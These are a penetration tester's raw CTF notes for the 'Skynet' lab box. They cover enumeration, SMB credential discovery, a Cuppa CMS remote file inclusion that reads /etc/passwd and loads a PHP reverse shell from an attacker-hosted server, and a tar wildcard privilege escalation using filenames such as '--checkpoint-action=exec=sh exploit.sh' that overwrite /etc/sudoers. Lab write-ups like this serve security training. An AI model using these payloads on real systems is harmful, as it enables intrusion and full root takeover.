# Raw Notes - Skynet

These notes preserve the original English solving process. The cleaned bilingual walkthroughs are available from [README.md](README.md).

# Reconnaissance

## Nmap

```bash
PORT    STATE SERVICE       VERSION
22/tcp  open  ssh           OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http          Apache/2.4.18 (Ubuntu)
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3          Dovecot pop3d
139/tcp open  netbios-ssn?
143/tcp open  imap          Dovecot imapd
445/tcp open  microsoft-ds?
OS fingerprint not ideal because: Timing level 5 (Insane) used
No OS matches for host
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

```

# Enumeration

## Enum4Linux

```bash
enum4linux -a skynet.thm
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Nov 26 21:36:53 2025

 =========================================( Target Information )=========================================
                                                                                                                                                                          
Target ........... skynet.thm                                                                                                                                             
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 =============================( Enumerating Workgroup/Domain on skynet.thm )=============================
                                                                                                                                                                          
                                                                                                                                                                          
[+] Got domain/workgroup name: WORKGROUP                                                                                                                                  
                                                                                                                                                                          
                                                                                                                                                                          
 =================================( Nbtstat Information for skynet.thm )=================================
                                                                                                                                                                          
Looking up status of 10.65.189.98                                                                                                                                         
        SKYNET          <00> -         B <ACTIVE>  Workstation Service
        SKYNET          <03> -         B <ACTIVE>  Messenger Service
        SKYNET          <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ====================================( Session Check on skynet.thm )====================================
                                                                                                                                                                          
                                                                                                                                                                          
[+] Server skynet.thm allows sessions using username '', password ''                                                                                                      
                                                                                                                                                                          
                                                                                                                                                                          
 =================================( Getting domain SID for skynet.thm )=================================
                                                                                                                                                                          
Domain Name: WORKGROUP                                                                                                                                                    
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                                      
                                                                                                                                                                          
                                                                                                                                                                          
 ====================================( OS information on skynet.thm )====================================
                                                                                                                                                                          
                                                                                                                                                                          
[E] Can't get OS info with smbclient                                                                                                                                      
                                                                                                                                                                          
                                                                                                                                                                          
[+] Got OS info for skynet.thm from srvinfo:                                                                                                                              
        SKYNET         Wk Sv PrQ Unx NT SNT skynet server (Samba, Ubuntu)                                                                                                 
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ========================================( Users on skynet.thm )========================================
                                                                                                                                                                          
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson       Name:   Desc:                                                                                             

user:[milesdyson] rid:[0x3e8]

 ==================================( Share Enumeration on skynet.thm )==================================
                                                                                                                                                                          
                                                                                                                                                                          
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET

[+] Attempting to map shares on skynet.thm                                                                                                                                
                                                                                                                                                                          
//skynet.thm/print$     Mapping: DENIED Listing: N/A Writing: N/A                                                                                                         
//skynet.thm/anonymous  Mapping: OK Listing: OK Writing: N/A
//skynet.thm/milesdyson Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                                            
                                                                                                                                                                          
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                
//skynet.thm/IPC$       Mapping: N/A Listing: N/A Writing: N/A

```

- The user name : milesdyson
- We found //skynet.thm/anonymous SMB share.

## Dirsearch

```bash
Target: http://skynet.thm/

[21:40:07] Starting: 
[21:40:09] 301 -  305B  - /js  ->  http://skynet.thm/js/                    
[21:40:09] 403 -  275B  - /.ht_wsr.txt                                      
[21:40:09] 403 -  275B  - /.htaccess.bak1                                   
[21:40:09] 403 -  275B  - /.htaccess.sample                                 
[21:40:09] 403 -  275B  - /.htaccess.save
[21:40:09] 403 -  275B  - /.htaccess.orig
[21:40:10] 403 -  275B  - /.htaccess_extra                                  
[21:40:10] 403 -  275B  - /.htaccess_orig
[21:40:10] 403 -  275B  - /.htaccess_sc
[21:40:10] 403 -  275B  - /.htaccessBAK
[21:40:10] 403 -  275B  - /.htaccessOLD                                     
[21:40:10] 403 -  275B  - /.htaccessOLD2                                    
[21:40:10] 403 -  275B  - /.html                                            
[21:40:10] 403 -  275B  - /.htm
[21:40:10] 403 -  275B  - /.htpasswd_test                                   
[21:40:10] 403 -  275B  - /.htpasswds
[21:40:10] 403 -  275B  - /.httr-oauth
[21:40:10] 403 -  275B  - /.php                                             
[21:40:10] 403 -  275B  - /.php3                                            
[21:40:13] 301 -  308B  - /admin  ->  http://skynet.thm/admin/              
[21:40:13] 403 -  275B  - /admin/                                           
[21:40:19] 301 -  309B  - /config  ->  http://skynet.thm/config/            
[21:40:19] 403 -  275B  - /config/                                          
[21:40:20] 301 -  306B  - /css  ->  http://skynet.thm/css/                  
[21:40:24] 403 -  275B  - /js/                                              
[21:40:32] 403 -  275B  - /server-status/                                   
[21:40:32] 403 -  275B  - /server-status
[21:40:33] 301 -  315B  - /squirrelmail  ->  http://skynet.thm/squirrelmail/

```

/js : Nothing

/admin 

/config

/css

/squirrelmail

## SMBClient

```bash
smbclient -L //skynet.thm -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET

```

- We have a `anonymous` share.

```bash
smbclient //skynet.thm/anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5826564 blocks available
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 00:42:16 2019
  ..                                  D        0  Thu Nov 26 11:04:00 2020
  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
  log3.txt                            N        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5826564 blocks available
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (3.5 KiloBytes/sec) (average 3.5 KiloBytes/sec)
smb: \logs\> get log2.txt
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 2.1 KiloBytes/sec)
smb: \logs\> get log3.txt
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \logs\> cd ..
smb: \> get file attention.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \file
smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5826564 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)

```

![image.png](screenshots/1-catlog1.png)

## BurpSuite

```bash
cyborg007haloterminator
```

![image.png](screenshots/2-burpsuite.png)

## Web page - Mail

![image.png](screenshots/3-webmail.png)

- We could access the mail and got the SBM password `)s{A&2Z=F^n_E.B`

## SMB share (milesdyson)

```bash
smbclient //skynet.thm/milesdyson -U milesdyson
Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 05:05:47 2019
  ..                                  D        0  Tue Sep 17 23:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
  notes                               D        0  Tue Sep 17 05:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019

                9204224 blocks of size 1024. 5831508 blocks available
smb: \> cd notes
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 05:18:40 2019
  ..                                  D        0  Tue Sep 17 05:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 05:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 05:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 05:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 05:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 05:01:29 2019
  important.txt                       N      117  Tue Sep 17 05:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 05:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 05:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 05:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 05:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 05:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 05:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 05:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 05:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 05:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 05:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 05:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 05:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 05:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 05:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 05:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 05:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 05:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 05:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 05:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 05:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 05:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 05:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 05:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 05:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 05:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 05:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 05:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 05:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 05:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 05:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 05:01:29 2019

                9204224 blocks of size 1024. 5831504 blocks available
smb: \notes\> get important.txt
getting file \notes\important.txt of size 117 as important.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
```

- We found `important.txt` file that contains an endpoint : `/45kra24zxs28v3yd`

```bash
cat important.txt

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

![image.png](screenshots/4-endpoint.png)

- Nothing interesting…

## Gobuster

```bash
gobuster dir -u http://skynet.thm/45kra24zxs28v3yd/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50

```

```bash
gobuster dir -u http://skynet.thm/45kra24zxs28v3yd/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://skynet.thm/45kra24zxs28v3yd/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 418]
/administrator        (Status: 301) [Size: 333] [--> http://skynet.thm/45kra24zxs28v3yd/administrator/]

```

- We found `http://skynet.thm/45kra24zxs28v3yd/administrator/`

![image.png](screenshots/5-adminportal.png)

## Searchsploit

```bash
searchsploit cuppa cms
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                          |  Path
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                                         | php/webapps/25971.txt
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

- We found a RFI exploit for CMS Cuppa.

## Exploit

```bash
http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

![image.png](screenshots/6-etcpassw.png)

## PHP Reverse Shell

```bash
/usr/share/laudanum/php/php-reverse-shell.php
```

![image.png](screenshots/7-revshell.png)

- We modified the PHP reverse shell file to include our attack machine IP and port. Saved it in the same directory as our python web server.

## Python Web Server

```bash
python3 -m http.server 80                                                                                                        
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

![image.png](screenshots/8-PyWebServer.png)

## Netcat listener

```bash
nc -nvlp 443
```

- We started a netcat listener on our attack machine.

## PHP Reverse Shell Execution

```bash
http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://192.168.131.169/php-reverse-shell.php
```

![image.png](screenshots/9-phprevshell.png)

![image.png](screenshots/10-PyWebServerReponse.png)

![image.png](screenshots/11-shell.png)

- We found our `user.txt` flag! The screenshot below is intentionally blurred where the flag value appears for the public writeup.

![image.png](screenshots/12-userflag.png)

# Privilege Escalation

![image.png](screenshots/13-lsla.png)

- There is a `backups` folder running with root privileges.
- There is a [`backup.sh`](http://backup.sh) script used to create a backup inside `/var/www/html`and save it as `backup.tgz`.

![image.png](screenshots/14-backups.png)

- We look into `/etc/crontab` and can see that the script is running root.

```bash
root    /home/milesdyson/backups/backup.sh
```

![image.png](screenshots/15-crontab.png)

- Now we can move to the directory used for backup `/var/www/html` and create a shell script [`exploit.sh`](http://exploit.sh) → Enter the checkpoint running the shell command.
- We used `sudo -l` to see the sudoers entry. Then used the `sudo bash` command to get the root shell.
- We finally got the `root.txt`flag!

```bash
$ cd /var/www/html
$ echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > exploit.sh
$ echo "/var/www/html"  > "--checkpoint-action=exec=sh exploit.sh"
$ echo "/var/www/html"  > --checkpoint=1
$ sudo -l
User www-data may run the following commands on skynet:
    (root) NOPASSWD: ALL
$ sudo bash
cat /root/root.txt
<redacted>
```
